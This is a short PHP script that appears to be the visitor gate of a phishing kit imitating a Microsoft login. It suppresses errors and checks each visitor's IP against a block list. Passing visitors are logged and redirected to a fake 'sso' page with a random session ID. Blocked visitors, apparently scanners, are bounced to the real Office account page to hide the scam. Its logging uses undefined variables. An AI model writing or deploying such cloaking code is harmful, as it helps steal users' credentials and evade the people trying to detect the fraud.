<?php @error_reporting(0);

require_once("functions.php");
$ips = array(	$_SERVER['REMOTE_ADDR'], );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("FUNC/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		redirectTo("sso/?sslchannel=true&sessionid=" . generateRandomString(80));
	}
	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://office.live.com/start/MyAccount.aspx");
		die();
	}
}
?>